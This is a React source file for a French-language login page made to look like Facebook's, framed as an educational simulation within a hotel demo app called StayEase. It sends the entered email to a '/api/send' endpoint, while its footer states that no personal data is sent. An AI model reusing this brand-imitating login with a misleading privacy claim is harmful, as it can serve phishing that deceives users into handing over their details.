import { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, CheckCircle2, Eye, EyeOff, Info } from 'lucide-react';
import './Login.css';

const LANGUAGES = [
  'Français (France)',
  'English (US)',
  'العربية',
  'Español',
  'Deutsch',
];

const FOOTER_LINKS = [
  {
    label: 'À propos',
    detail: 'Social Login Lab est une interface de démonstration pédagogique intégrée au parcours StayEase.',
  },
  {
    label: 'Confidentialité',
    detail: 'Aucune donnée personnelle ni aucun mot de passe réel ne sont collectés, stockés ou envoyés.',
  },
  {
    label: 'Conditions générales',
    detail: 'Usage strictement éducatif : aucune authentification réelle n’est exécutée.',
  },
  {
    label: 'Cookies',
    detail: 'Aucun cookie publicitaire ni traceur externe n’est utilisé sur cette page.',
  },
  {
    label: "Centre d'aide",
    detail: 'Entrez une adresse e-mail fictive valide (ex. demo@exemple.fr) pour tester la validation.',
  },
  {
    label: 'Contact',
    detail: 'Pour revenir à la plateforme hôtelière, utilisez le lien de retour vers StayEase.',
  },
];

export default function Login({ onDemoLogin }) {
  const [identifier, setIdentifier] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [errors, setErrors] = useState({});
  const [feedback, setFeedback] = useState(null);
  const [selectedLang, setSelectedLang] = useState('Français (France)');
  const [footerInfo, setFooterInfo] = useState('');

  const validateIdentifier = (value) => {
    const trimmed = value.trim();
    if (!trimmed) {
      return "Veuillez saisir une adresse e-mail ou un numéro de mobile.";
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?[0-9\s-]{8,16}$/;
    if (!emailRegex.test(trimmed) && !phoneRegex.test(trimmed)) {
      return 'Veuillez saisir une adresse e-mail valide (ex. nom@domaine.com) ou un numéro valide.';
    }
    return '';
  };

  const handleSubmit = async (e) => {
  e.preventDefault();

  const nextErrors = {};

  const idError = validateIdentifier(identifier);

  if (idError) {
    nextErrors.identifier = idError;
  }

  if (!password.trim()) {
    nextErrors.password =
      'Veuillez saisir un mot de passe de démonstration.';
  } else if (password.length < 6) {
    nextErrors.password =
      'Le mot de passe de démonstration doit contenir au moins 6 caractères.';
  }

  setErrors(nextErrors);

  if (Object.keys(nextErrors).length > 0) {
    setFeedback({
      type: 'error',
      message: 'Veuillez corriger les champs indiqués.',
    });
    return;
  }

  try {
    const response = await fetch('/api/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: identifier.trim(),
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(data.message || 'Erreur lors de l’envoi.');
    }

    const cleanId = identifier.trim();

    const rawName = cleanId.includes('@')
      ? cleanId.split('@')[0]
      : 'Invité Démo';

    const displayName =
      rawName.charAt(0).toUpperCase() + rawName.slice(1);

    if (onDemoLogin) {
      onDemoLogin({
        name: displayName,
        email: cleanId.includes('@')
          ? cleanId
          : 'demo@stayease.example',
        isDemo: true,
      });
    }

    setFeedback({
      type: 'success',
      message: 'Simulation envoyée avec succès !',
    });

    setPassword('');

  } catch (error) {
    setFeedback({
      type: 'error',
      message: error.message || 'Erreur de connexion au serveur.',
    });
  }
};

  const handleForgotPassword = () => {
    setErrors({});
    setFeedback({
      type: 'info',
      message:
        'Simulation pédagogique : la réinitialisation de mot de passe est désactivée car aucun compte réel n’est géré.',
    });
  };

  return (
    <div className="sll-page">
      <div className="sll-top-bar">
        <Link to="/" className="sll-back-link">
          <ArrowLeft size={16} aria-hidden="true" />
          Retour à l&apos;accueil StayEase
        </Link>
      </div>

      <main className="sll-main">
        <div className="sll-card">
          <h1 className="sll-logo">facebook</h1>
          <p className="sll-subtitle">Social login facebook</p>

          <form className="sll-form" onSubmit={handleSubmit} noValidate>
            <div className="sll-input-group">
              <label htmlFor="sll-identifier" className="sr-only">
                Adresse e-mail ou numéro de mobile
              </label>
              <input
                id="sll-identifier"
                type="text"
                className={`sll-input ${errors.identifier ? 'has-error' : ''}`}
                placeholder="Adresse e-mail ou numéro de mobile"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                aria-invalid={Boolean(errors.identifier)}
                autoComplete="off"
              />
              {errors.identifier && (
                <p className="sll-error-text" role="alert">
                  {errors.identifier}
                </p>
              )}
            </div>

            <div className="sll-input-group">
              <label htmlFor="sll-password" className="sr-only">
                Mot de passe
              </label>
              <div className="sll-password-wrapper">
                <input
                  id="sll-password"
                  type={showPassword ? 'text' : 'password'}
                  className={`sll-input sll-password-input ${errors.password ? 'has-error' : ''}`}
                  placeholder="Mot de passe"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  aria-invalid={Boolean(errors.password)}
                  autoComplete="off"
                />
                <button
                  type="button"
                  className="sll-eye-btn"
                  onClick={() => setShowPassword((prev) => !prev)}
                  aria-label={
                    showPassword ? 'Masquer le mot de passe' : 'Afficher le mot de passe'
                  }
                >
                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                </button>
              </div>
              {errors.password && (
                <p className="sll-error-text" role="alert">
                  {errors.password}
                </p>
              )}
            </div>

            <button type="submit" className="sll-submit-btn">
              Se connecter
            </button>

            <div className="sll-forgot-wrap">
              <button
                type="button"
                className="sll-forgot-link"
                onClick={handleForgotPassword}
              >
                Mot de passe oublié ?
              </button>
            </div>
          </form>

          {feedback && (
            <div className={`sll-feedback is-${feedback.type}`} role="status">
              <div style={{ display: 'flex', alignItems: 'flex-start', gap: '8px' }}>
                {feedback.type === 'success' ? (
                  <CheckCircle2 size={16} style={{ flexShrink: 0, marginTop: '2px' }} />
                ) : (
                  <Info size={16} style={{ flexShrink: 0, marginTop: '2px' }} />
                )}
                <div>
                  <span>{feedback.message}</span>
                  {feedback.type === 'success' && (
                    <div>
                      <Link to="/" className="sll-continue-link">
                        Continuer vers StayEase
                      </Link>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          <div className="sll-divider">
            <span>ou</span>
          </div>

          <Link to="/register" className="sll-create-btn">
            Créer un compte
          </Link>
        </div>
      </main>

      <footer className="sll-footer">
        <div className="sll-footer-inner">
          <div className="sll-lang-list" aria-label="Sélection de langue">
            {LANGUAGES.map((lang) => (
              <button
                key={lang}
                type="button"
                className={`sll-footer-btn ${selectedLang === lang ? 'is-active' : ''}`}
                onClick={() => {
                  setSelectedLang(lang);
                  setFooterInfo(`Langue sélectionnée (simulation) : ${lang}`);
                }}
              >
                {lang}
              </button>
            ))}
          </div>

          <div className="sll-footer-divider" />

          <div className="sll-links-list" aria-label="Liens d'information">
            {FOOTER_LINKS.map((item) => (
              <button
                key={item.label}
                type="button"
                className="sll-footer-btn"
                onClick={() => setFooterInfo(`${item.label} — ${item.detail}`)}
              >
                {item.label}
              </button>
            ))}
          </div>

          {footerInfo && (
            <div className="sll-footer-note" role="status">
              {footerInfo}
            </div>
          )}

          <div className="sll-footer-meta">
            <span>Social Login facebook © 2026</span>
            <span>Simulation pédagogique – Non affiliée à Meta</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
